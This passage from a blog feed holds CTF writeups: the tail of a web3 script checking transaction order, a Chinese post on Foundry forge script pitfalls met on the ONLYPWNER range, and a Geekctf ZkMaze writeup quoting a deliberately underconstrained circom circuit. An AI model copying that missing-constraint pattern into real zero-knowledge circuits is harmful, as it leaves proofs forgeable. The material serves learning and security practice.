&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_transaction_receipt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_transaction_receipt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_transaction_receipt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;0x&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;hash3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()))
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    block &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;rpc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;eth&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;get_block&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;latest&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    txs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;transactions
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(txs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;index&lt;&#x2F;span&gt;&lt;span&gt;(hash1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;txs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;index&lt;&#x2F;span&gt;&lt;span&gt;(hash2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;txs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;index&lt;&#x2F;span&gt;&lt;span&gt;(hash3)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Foundry forge script 一二事。some details that need attention</title>
        <published>2024-07-18T17:40:59+08:00</published>
        <updated>2024-07-18T17:40:59+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/forgescript/"/>
        <id>/blog/forgescript/</id>
        
        <content type="html" xml:base="/blog/forgescript/">&lt;p&gt;​	不久前 All solve了 &lt;a href=&quot;https:&#x2F;&#x2F;onlypwner.xyz&quot;&gt;ONLYPWNER&lt;&#x2F;a&gt; 靶场，Rank 10。期间遇到了不少因为&lt;code&gt;forge&lt;&#x2F;code&gt;特性而导致的问题，记录一下以备查阅。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;simulation-failed&quot;&gt;Simulation Failed&lt;&#x2F;h3&gt;
&lt;p&gt;​	Forge Script在执行时一共有两层仿真，第一层允许使用cheatcode，字节码的运行时实现依赖的是foundry代理过的；而第二层就基本与真实的EVM环境一致。&lt;&#x2F;p&gt;
&lt;p&gt;​	第二层仿真时不会为cheatcode而报错，只是会不起作用，从而导致一些受影响于cheatcode修改的环境的代码错误。&lt;&#x2F;p&gt;
&lt;p&gt;​	比如我在Script脚本中写了&lt;code&gt;vm.wrap(xxx)&lt;&#x2F;code&gt;，但是在simulation时不会生效，也就导致了这一错误。&lt;&#x2F;p&gt;
&lt;p&gt;​	这一问题可以通过&lt;code&gt;--skip-simulation&lt;&#x2F;code&gt;来解决，不过解决这个没啥意义，broadcast上链之后也不允许你用这些修改环境的cheatcode。需要指定某一个blocknumber，或者需要使得timestamp在某一个区间内，建议的做法是把要执行的脚本找一个合约包装起来，然后再写一个Script或者用cast来触发。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;0-bytes-of-code&quot;&gt;0 bytes of code&lt;&#x2F;h3&gt;
&lt;p&gt;​	这是forge script的经典问题，无法处理0 bytes的contract。比方说我用CREATE&#x2F;CREATE2去执行了一段initialize code，但是不返回任何runtime code，forge script 大概率就会报这个错。以及调用&lt;code&gt;Selfdestruct&lt;&#x2F;code&gt;（CTF中比较常见）时会造成合约的代码为0，forge script在这种时候就不会起作用。&lt;&#x2F;p&gt;
&lt;p&gt;​	我个人比较喜欢用 CREATE&#x2F;CREATE2 来实现一些任务，以及其他一些情况不得不需要这么处理的话也得避免这一任务在simulation中出现，类似上一个问题的解法。&lt;&#x2F;p&gt;
&lt;p&gt;​	网上很多建议会说试试&lt;code&gt;--skip-simulation&lt;&#x2F;code&gt;，这是无效的，因为这只会跳过第二次的仿真，而 Script 会在第一次报错。&lt;del&gt;尚且不知道第二次仿真能否处理因为无法到达这一步&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;vm-startbroadcast&quot;&gt;vm.startBroadcast&lt;&#x2F;h3&gt;
&lt;p&gt;​	刚开始用foundry forge的时候对&lt;code&gt;vm.startBroadcast()&lt;&#x2F;code&gt;印象最深，以为是用intialize 封装了整个broadcast的脚本内容，&lt;em&gt;然而实际上并没有&lt;&#x2F;em&gt;。Script 的每一次external call都是隔离的交易，由于网络因素交易之间可能时间差距会很大，也没有办法保证后面的就正确执行&#x2F;不会被抢先。&lt;&#x2F;p&gt;
&lt;p&gt;​	&lt;code&gt;vm.startBroadcast()&lt;&#x2F;code&gt;会把交易的发出者更改为命令行传入的&lt;code&gt;--private-key&lt;&#x2F;code&gt;参数对应的地址。也可以通过加参数来改为其他。所以如果想要重入的话一般不要把重入函数写在Script的fallback&#x2F;recevive里，还是得另外再开一个辅助合约。&lt;&#x2F;p&gt;
&lt;p&gt;​	还有一点难以意识到的是即使你指定了&lt;code&gt;--broadcast&lt;&#x2F;code&gt;，也只会广播&lt;code&gt;vm.startBroadcast&lt;&#x2F;code&gt;和&lt;code&gt;vm.stopBroadcast&lt;&#x2F;code&gt;包裹的内容。同理你要是不指定&lt;code&gt;is Script&lt;&#x2F;code&gt;或&lt;code&gt;vm.startBroadcast&lt;&#x2F;code&gt;，大概率也不会广播。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;unknown-contract-at-address-0xbebe&quot;&gt;Unknown contract at address 0xbebe…&lt;&#x2F;h3&gt;
&lt;p&gt;​	这是指定&lt;code&gt;--debug&lt;&#x2F;code&gt;调试时可能会出现的问题，forge 不会把你的源代码映射到这一地址上。好像有 feature request 有提到这一点，不知道现在实现了没有。&lt;del&gt;如果有的话可以告诉我一声&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;​	调试方案我目前一般还是使用 electron.js 构建的 remix desktop（remix online连anvil啥的容易触发CORS），较短的、没啥环境依赖的代码可以丢到&lt;a href=&quot;https:&#x2F;&#x2F;www.evm.codes&#x2F;playground&quot;&gt;EVM.code playground&lt;&#x2F;a&gt; 。forge这个终端调试实在不方便看栈上数据、内存数据等。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;others&quot;&gt;Others&lt;&#x2F;h3&gt;
&lt;p&gt;​	Foundry 最好用的应该还是用来test和fuzz啥的，以及很多的 cheatcode 和 console。&lt;a href=&quot;https:&#x2F;&#x2F;book.getfoundry.sh&#x2F;&quot;&gt;文档&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;​	其他的目前想不起来。以后遇到了或者想起来了在写吧。有问题欢迎找我…&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Geekctf - Geekcon writeup: lacking zk constraints &amp; 8 bytes eval contract</title>
        <published>2024-04-14T22:14:00+08:00</published>
        <updated>2024-04-14T22:14:00+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/geekctf/"/>
        <id>/blog/geekctf/</id>
        
        <content type="html" xml:base="/blog/geekctf/">&lt;p&gt;I spent some time this week solving three Geekctf challenges and got 26th place. Interesting challenge thanks to the authors from 0ops@SJTU.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0rays-club.feishu.cn&#x2F;wiki&#x2F;Ts1twa8OBijasEk2uHrcGlt4nAc&quot;&gt;zh-CN wp&lt;&#x2F;a&gt; (draft)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;zkmaze&quot;&gt;ZkMaze&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;del&gt;There is even a ZK chall&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;public_inputs &lt;&#x2F;code&gt; can be found &lt;code&gt;in.&#x2F;out&#x2F;chall.sol &lt;&#x2F;code&gt; directly&lt;&#x2F;p&gt;
&lt;p&gt;just draw it and see the maze&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;_import_ matplotlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;pyplot _as_ plt
&lt;&#x2F;span&gt;&lt;span&gt;_import_ numpy _as_ np
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;_with_ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;.&#x2F;out&#x2F;chall.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;rt&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) _as_ f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    public_inputs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span&gt;][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;44&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;271&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;), uint(&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    public_inputs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(public_inputs[i]) _for_ i _in_ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(public_inputs))]
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(public_inputs)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Traverse in reverse order using the origin as the starting point_
&lt;&#x2F;span&gt;&lt;span&gt;maze &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[public_inputs[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;] _for_ i _in_ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(maze)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;maze &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;np&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;array&lt;&#x2F;span&gt;&lt;span&gt;(maze)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;fig, ax &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;subplots&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;ax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;imshow&lt;&#x2F;span&gt;&lt;span&gt;(maze&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_cmap_&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;binary&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_xticks&lt;&#x2F;span&gt;&lt;span&gt;([])
&lt;&#x2F;span&gt;&lt;span&gt;ax&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;set_yticks&lt;&#x2F;span&gt;&lt;span&gt;([])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAXQAAAFyCAYAAADlOiFOAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAXNSURBVHhe7dbRjdpAFEBROwXYFWz&#x2F;hbkBTAMTLPzJAlFQor06R3rSMJ+j8WXmaZrGbQD4wbZtmwT9Tfu+nyueWdf1XMHf8929dr1ep6+vr+lyuQj6u8ZwTO+Y5+NKwWf47l47gn48pI4&#x2F;v1&#x2F;nHgA&#x2F;nKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANECDpAhKADRAg6QISgA0QIOkCEoANEzLcZ+75Py7Lcd3hono+jAv6lMca54jvX63Va13U6Ou6FDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6AARgg4QIegAEYIOECHoABGCDhAh6PAfjDHMG8OfEXSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSACEEHiBB0gAhBB4gQdIAIQQeIEHSAiPk2Y9&#x2F;3aVmW+w4PzfNxVLwyxjhXPOM+8WlHx73QASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIELQASIEHSBC0AEiBB0gQtABIgQdIGK+zdi2bVqW5b7DQ+u6niue2ff9XPGM+8SnXS6Xe9DvPwH4qbZtm34D9kshc5VTB1wAAAAASUVORK5CYII=&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Starting point 0 is lower left, goal 24 is in the upper right corner. It is impossible to walk normally&lt;&#x2F;p&gt;
&lt;p&gt;You can use snarkyjs to read constraints, but it’s still more intuitive to read circom first~&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;powershell&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-powershell &quot;&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span&gt;snarkjs r1cs print .\out\maze.r1cs .\out\maze.sym
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Just a short audit could found that it seems that this paragraph &lt;code&gt;&amp;lt; -- &lt;&#x2F;code&gt; lacks the necessary constraints.(If you know about circom before)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c++&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-c++ &quot;&gt;&lt;code class=&quot;language-c++&quot; data-lang=&quot;c++&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;template &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;checkInMaze&lt;&#x2F;span&gt;&lt;span&gt;(_n_) {
&lt;&#x2F;span&gt;&lt;span&gt;    signal input pos_x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    signal input pos_y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    signal output out&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    signal tmp_x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    signal tmp_y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    tmp_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;--&lt;&#x2F;span&gt;&lt;span&gt; pos_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; pos_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    tmp_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(tmp_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;    
&lt;&#x2F;span&gt;&lt;span&gt;    tmp_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;--&lt;&#x2F;span&gt;&lt;span&gt; pos_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; pos_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
